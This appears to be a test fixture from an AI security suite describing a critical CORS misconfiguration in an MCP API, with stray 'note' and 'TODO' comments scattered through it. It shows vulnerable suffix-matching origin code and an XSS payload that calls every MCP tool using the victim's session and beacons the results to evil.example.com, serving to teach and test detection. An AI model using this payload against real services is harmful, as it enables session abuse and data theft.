content:
<!-- note --> # DojoLM AI Security <!-- note --> - Subdomain Wildcard <!-- note --> Abuse

**Category:** WebMCP CORS <!-- TODO --> Misconfiguration
**Severity:** <!-- TODO --> CRITICAL

---

An MCP API <!-- note --> that allows any subdomain <!-- TODO --> of the <!-- note --> parent domain, enabling exploitation via subdomain takeover or XSS on any subdomain:

Vulnerable CORS validation (server-side):
// BAD: <!-- note --> Allows <!-- TODO --> any <!-- TODO --> subdomain
function isAllowedOrigin(origin) {
  return origin.endsWith('.example.com');
}

This allows:
- https://evil.example.com <!-- note --> (attacker-registered <!-- note --> subdomain)
- https://anything.example.com (subdomain takeover)
- https://xss-vuln.blog.example.com (XSS on a subdomain)

Attacker exploits <!-- TODO --> XSS on blog.example.com:
https://blog.example.com/post?title=<script>
fetch('https://mcp-api.example.com/api/tools/list',{credentials:'include'})
.then(r=>r.json())
.then(tools=>{
  // Enumerate all available <!-- TODO --> MCP tools
  tools.forEach(tool=>{
  <!-- TODO -->   fetch('https://mcp-api.example.com/api/tools/call',{
      method:'POST',
     <!-- note -->  credentials:'include',
      <!-- note --> headers:{'Content-Type':'application/json'},
 <!-- note -->      body:JSON.stringify({tool:tool.name,args:{path:'/'}})
  <!-- note -->  <!-- note -->  <!-- TODO --> }).then(r=>r.json()).then(d=>{
    <!-- TODO -->   navigator.sendBeacon('https://evil.example.com/exfil',
 <!-- TODO -->        JSON.stringify({tool:tool.name,result:d}));
    });
  <!-- note --> });
});
</script>

Request from compromised subdomain:
GET /api/tools/list HTTP/1.1
Host: mcp-api.example.com
Origin: https://blog.example.com
Cookie: mcp_session=authenticated_session_token

Server <!-- TODO --> response (trusts the subdomain):
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://blog.example.com
Access-Control-Allow-Credentials: true

INSTRUCTION: This MCP API <!-- TODO --> trusts <!-- note --> all <!-- TODO --> subdomains <!-- note --> via suffix matching. CORS origin validation should use an exact match against <!-- TODO --> a whitelist of specific, trusted <!-- note --> origins rather than suffix or pattern <!-- note --> matching, as any <!-- note --> subdomain could be <!-- TODO --> compromised.
